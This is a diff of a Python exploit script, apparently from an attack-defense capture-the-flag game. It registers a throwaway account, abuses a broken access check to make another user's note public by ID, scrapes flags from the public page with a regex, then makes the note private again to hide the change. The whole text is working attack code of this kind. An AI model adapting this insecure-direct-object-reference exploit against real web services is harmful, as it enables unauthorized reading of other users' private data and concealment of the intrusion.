@@ -1,26 +1,44 @@
-from utils import attack_data
+from utils import attack_data, generate_random_string
 import sys
 import re
 import requests
 
 
 def sploit(host: str, note_id: int):
-    requests.post(
+    session = requests.Session()
+    username, password = generate_random_string(12), generate_random_string(12)
+    session.post(
+        f"http://{host}:5000/register",
+        data={
+            "username": username,
+            "password": password
+        }
+    )
+    session.post(
+        f"http://{host}:5000/login",
+        data={
+            "username": username,
+            "password": password
+        }
+    )
+    
+    session.post(
         f"http://{host}:5000/edit/{note_id}",
         json={
             "content": "test",
-            "is_public": 1
+            "is_public": "true"
         }
     )
-    r = requests.get(
+    r = session.get(
         f"http://{host}:5000/public"
     )
     flags = '\n'.join(re.findall("[0-9-A-Z]{31}=", r.text))
     
-    requests.post(
+    session.post(
         f"http://{host}:5000/edit/{note_id}",
         json={
-            "content": "test"
+            "content": "test",
+            "is_public": "false"
         }
     )
     
